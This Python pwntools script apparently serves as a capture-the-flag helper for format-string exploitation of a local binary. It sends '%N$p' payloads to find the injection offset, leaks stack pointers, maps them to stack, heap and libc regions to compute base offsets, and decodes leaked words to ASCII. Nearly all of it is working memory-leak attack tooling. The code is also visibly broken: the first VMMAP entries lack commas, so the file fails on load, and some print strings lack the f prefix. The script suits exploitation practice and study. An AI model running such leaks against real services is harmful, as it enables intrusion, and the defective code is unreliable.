from pwn import *
# -----------------------------
# Program sections for clasification
# -----------------------------
VMMAP = [
    (0x555555554000, 0x555555555000, "r--p", "vuln") ## ----------- With Pie --------------
    (0x555555555000, 0x555555556000, "r-xp", "vuln")
    (0x555555556000, 0x555555557000, "r--p" , "vuln")
    (0x555555557000, 0x555555558000, "r--p", "vuln")
    (0x555555558000, 0x555555559000, "rw-p", "vuln")
    (0x555555559000, 0x55555557a000, "rw-p", "[heap]") ## ---------------------------------
    (0x400000, 0x401000, "r--p", "vuln"), # -------------- No pie -------------------
    (0x401000, 0x402000, "r-xp", "vuln"),
    (0x402000, 0x403000, "r--p", "vuln"),
    (0x403000, 0x404000, "r--p", "vuln"),
    (0x404000, 0x405000, "rw-p", "vuln"),
    (0x405000, 0x426000, "rw-p", "[heap]"),# -----------------------------------------
    (0x7ffff7dc2000, 0x7ffff7dc5000, "rw-p", "[anon]"),
    (0x7ffff7dc5000, 0x7ffff7deb000, "r--p", "libc.so.6"),
    (0x7ffff7deb000, 0x7ffff7f41000, "r-xp", "libc.so.6"),
    (0x7ffff7f41000, 0x7ffff7f94000, "r--p", "libc.so.6"),
    (0x7ffff7f94000, 0x7ffff7f98000, "r--p", "libc.so.6"),
    (0x7ffff7f98000, 0x7ffff7f9a000, "rw-p", "libc.so.6"),
    (0x7ffff7f9a000, 0x7ffff7fa7000, "rw-p", "[anon]"),
    (0x7ffff7fc2000, 0x7ffff7fc4000, "rw-p", "[anon]"),
    (0x7ffff7fc4000, 0x7ffff7fc8000, "r--p", "[vvar]"),
    (0x7ffff7fc8000, 0x7ffff7fca000, "r-xp", "[vdso]"),
    (0x7ffff7fca000, 0x7ffff7fcb000, "r--p", "ld-linux-x86-64.so.2"),
    (0x7ffff7fcb000, 0x7ffff7ff1000, "r-xp", "ld-linux-x86-64.so.2"),
    (0x7ffff7ff1000, 0x7ffff7ffb000, "r--p", "ld-linux-x86-64.so.2"),
    (0x7ffff7ffb000, 0x7ffff7ffd000, "r--p", "ld-linux-x86-64.so.2"),
    (0x7ffff7ffd000, 0x7ffff7fff000, "rw-p", "ld-linux-x86-64.so.2"),
    (0x7ffffffde000, 0x7ffffffff000, "rw-p", "[stack]"),
]



# -----------------------------
# Color Module (ANSI escapes)
# -----------------------------
class C:
    RESET = "\033[0m"
    BOLD  = "\033[1m"

    RED     = ERROR   = "\033[31m" # Errors
    GREEN   = SUCCESS = "\033[32m" # Success
    YELLOW  = WARNING = "\033[33m" # Warning
    BLUE    = INFO    = "\033[34m" # Info
    MAGENTA = DEBUG   = "\033[35m" # Debug
    CYAN    = DATA    = "\033[36m" # Data
    WHITE   = CLASSIC = "\033[37m"



# ------------------------------------------------------------
# classify_addr()
#     Given an address and vmmap entries return:
#         section_name, (start,end)
# ------------------------------------------------------------
def classify_addr(addr: int, maps=VMMAP):
    for start, end, perm, obj in maps:
        if not (start <= addr < end):
            continue

        # Stack
        if "[stack]" in obj:
            return f"stack ({hex(start)} - {hex(end)})"

        # Heap
        if "[heap]" in obj:
            return f"heap ({hex(start)} - {hex(end)})"

        # VDSO/VVAR
        if "[vdso]" in obj:
            return f"vdso ({hex(start)} - {hex(end)})"
        if "[vvar]" in obj:
            return f"vvar ({hex(start)} - {hex(end)})"

        # Loader
        if obj.startswith("/lib") and "ld-" in obj:
            return f"ld ({hex(start)} - {hex(end)})"

        # Shared libs
        if obj.endswith(".so") or ".so." in obj or "/lib" in obj:
            return f"lib ({hex(start)} - {hex(end)})"

        # Main binary (anonymous but executable)
        if obj == "":
            if "x" in perm:
                return f".text ({hex(start)} - {hex(end)})"
            if "w" in perm:
                return f".data ({hex(start)} - {hex(end)})"
            return f"anon ({hex(start)} - {hex(end)})"

        # File-backed binary sections
        if perm.startswith("r-x"):
            return f".text ({hex(start)} - {hex(end)})"
        if "rw" in perm:
            return f".data ({hex(start)} - {hex(end)})"

        return f"file ({hex(start)} - {hex(end)})"

    return "unknown (None - None)"



# ------------------------------------------------------------
# process_leaks()
#     Takes gs_lookup() results → classifies → computes offsets
#     Dedup: only one entry per memory range
# ------------------------------------------------------------
def process_leaks(results, maps=VMMAP, outfile="base_offset.txt"):
    seen_ranges = set()
    offsets = []

    for idx, leak, _ in results:
        # ignore <EOF>
        if leak.startswith(b"<"):
            continue

        # remove b"0x"
        try:
            ptr = int(leak, 16)
        except:
            continue

        # Added as a result of modificating of classify_addr()
        processing = (classify_addr(ptr, maps).replace('(', '').replace(')', '').replace('-', '').split(' '))
        del processing[2]
        print(processing)

        if processing[1] == "None":
            continue
        
        processing[1] = int(processing[1], 16)
        processing[2] = int(processing[2], 16)
        print(processing)

        section, start, end = processing

        # -----------

        #section, rng = classify_addr(ptr, maps)
        #if processing[1] == "None":
        #   continue

        # if this range was already processed, skip it
        if (start, end) in seen_ranges:
            continue

        # compute offset from section base
        offset = ptr - start

        # Mark as processed
        seen_ranges.add((start, end))

        # store sortable entry
        offsets.append((
            offset,
            ptr,
            section,
            idx,
            f"{hex(start)}-{hex(end)}"
        ))

    # Sort offsets (CHATGPTd This)
    offsets.sort(key=lambda x: x[0])

    # Write to file
    with open(outfile, "w") as f:
        for off, ptr, section, idx, rng in offsets:
            f.write(f"{hex(off)}  {hex(ptr)}  {section}  %{idx}$p  {rng}\n")

    return offsets


# ------------------------------------------------------------
# gfs_off()
#     Finds the format-string offset where your test value
#     (AAAA or AAAAAAAA) appears in memory.
# ------------------------------------------------------------
def gfs_off(
    p_name: str = "./vuln",
    architecture: int = 64,
    start_line: bytes = b": \n",
    recv_line: bytes = b": ",
    lim: int = 50,
) -> int:

    # Test pattern based on architecture size
    test: bytes = b"AAAAAAAA" if architecture == 64 else b"AAAA"
    f_spec: str = "$p" if architecture == 64 else "$x"

    with context.local(log_level="warn"):
        for i in range(lim + 1):
            try:
                tr = process(p_name)

                # Send format-string payload: AAAAAAAA%N$p
                tr.sendlineafter(start_line, test + f"%{i}{f_spec}".encode())

                # Skip up to marker
                tr.recvuntil(recv_line, timeout=0.2)

                # Receive the leaked line
                leak: bytes = tr.recvline(timeout=0.2)
                leaked_hex: bytes = leak.strip() if leak else b""

                tr.close()

                # If the known test pattern appears -> found the offset
                if test.hex().encode() in leaked_hex:
                    return i

            except EOFError:
                # Process crashed -> ignore and continue trying
                tr.close()
                continue

        return -1



# ------------------------------------------------------------
# gs_lookup()
#     Prints all %N$p leaks from 0..lim.
#     If 'lookup' is provided, passes leaks to hit_matcher().
# ------------------------------------------------------------
def gs_lookup(
    p_name: str = "./vuln",
    architecture: int = 64,
    start_line: bytes = b": \n",
    recv_line: bytes = b": ",
    lim: int = 50,
    spec: str = "",
    lookup: bytes = b''
) -> None:

    f_spec: str = spec if spec else ("$p" if architecture == 64 else "$x")
    results: list[tuple[int, bytes, str]] = []

    with context.local(log_level="warn"):
        for i in range(1, lim):
            try:
                tr = process(p_name)

                # Send %N$p format request
                tr.sendlineafter(start_line, f"%{i}{f_spec}".encode())
                tr.recvuntil(recv_line, timeout=0.2)

                # Capture the leak
                leak = tr.recvline(timeout=0.2).strip()
                tr.close()
                # Debugging print(leak)
                classification = "0x01" if b'nil' in leak else leak
                results.append((i, leak, classify_addr(int(classification, 16))))

            except EOFError:
                tr.close()
                results.append((i, b"<EOF>"))
                continue

    # Print all stack leaks
    for idx, leak, region in results:
        print(f"{C.BLUE}position {idx}: {leak} -> {C.RESET}{C.WARNING}{region}{C.RESET}")

    # Perform lookup matching if requested
    if lookup != b'':
        hit_matcher(lookup, results)
    
    process_leaks(results)



# ------------------------------------------------------------
# hit_matcher()
#     Attempts to match a byte sequence in stack leaks.
#     Handles:
#         - Big/little endian matching
#         - Byte realignment (odd hex lengths)
#         - Printing reconstructed ASCII interpretations
# ------------------------------------------------------------
def hit_matcher(
    look: bytes = b"",
    results: list[tuple[int, bytes, str]] = [],
    direct: bool = False,
    direct_ls: list[bytes] = []
) -> None:

    # Big-endian and little-endian matching patterns
    lr: bytes = (look[::-1].hex()).encode()   # reversed/endian swapped
    l: bytes  = (look.hex()).encode()

    nxt: int = 0
    little_end: list[str] = []
    big_end: list[str] = []

    # ------------------------------------------------------------
    # Indirect mode → operates on scanned %N$p outputs
    # ------------------------------------------------------------
    if direct == False:

        for idx, leak, _ in results:

            # Check if lookup appears in this leak
            if l in leak or lr in leak:
                print(f"{C.MAGENTA}[!] Hit for lookup bytes on{C.RESET} {C.CYAN}{idx}: {leak}{C.RESET}")
                nxt += 1
                print("{C.BLUE}[*] Attempting re-ordering including next 3...{C.RESET}")

            # Process next few values after finding a hit
            if 0 < nxt < 4:

                store = leak[2:]      # drop '0x'
                slice_len = len(store) - 1

                # Fix odd number of hex digits by inserting '0'
                if len(store) % 2 != 0:
                    store = store[:slice_len] + b'0' + store[slice_len:]

                # Convert hex → bytes → ASCII
                try:
                    store_ascii = bytes.fromhex(store.decode()).decode('ASCII')
                except:
                    store_ascii = "<non-ascii>"

                print(f"{C.BLUE}[+] re-ordering {nxt}:{C.RESET} {C.CYAN}{store_ascii} | {store_ascii[::-1]}{C.RESET}")

                little_end.append(store_ascii[::-1])
                big_end.append(store_ascii)

                nxt += 1



    # ------------------------------------------------------------
    # Direct mode → user-specified list of hex values
    # ------------------------------------------------------------
    else:
        print("{C.MAGENTA}[*] Invoked direct call, attempting to parse list of bytes given...{C.RESET}")

        try:
            for add in direct_ls:
                nxt += 1

                store = add[2:]
                slice_len = len(store) - 1

                # Fix odd hex nibble count
                if len(store) % 2 != 0:
                    store = store[:slice_len] + b'0' + store[slice_len:]

                store_ascii = bytes.fromhex(store.decode()).decode('ASCII')
                print(f"{C.BLUE}[+] re-ordering {nxt}:{C.RESET} {C.CYAN}{store_ascii} | {store_ascii[::-1]}{C.RESET}")

                little_end.append(store_ascii[::-1])
                big_end.append(store_ascii)

        except Exception as e:
            print(f"{C.RED}Error occurred at hit_matcher: {e}{C.RESET}")
    # Output reconstructed interpretations
    print(f'\n{C.BLUE}If stack is little endian:{C.RESET} {C.CYAN}{"".join(little_end)}{C.RESET}')
    print(f'\n{C.BLUE}If stack is big endian:{C.RESET} {C.CYAN}{"".join(big_end)}{C.RESET}')

# ------------------------------------------------------------
# ghex_ascii()
#     Turns passed hex int | str to ascii
# ------------------------------------------------------------

def ghex_toAscii(
    conv: int | str,
    end: str = "BIG"
) -> str:
    converted: str = (bytes.fromhex(hex(conv)[2:])).decode('ascii') if type(conv) == int else (bytes.fromhex(conv).decode('ascii') if '0x' not in conv else bytes.fromhex(conv[2:]).decode('ascii'))
    reversed: str = converted[::-1]
    return (converted if end.upper() == "BIG" else reversed)

# ------------------------------------------------------------
# cprint()
#     Prints text in cool colors (check C class at the top for options)
# ------------------------------------------------------------

def cprint(
    text: str,
    color: str
) -> None:
    color = getattr(C, color.upper())
    reset = C.RESET
    print(f'{color}{text}{reset}')
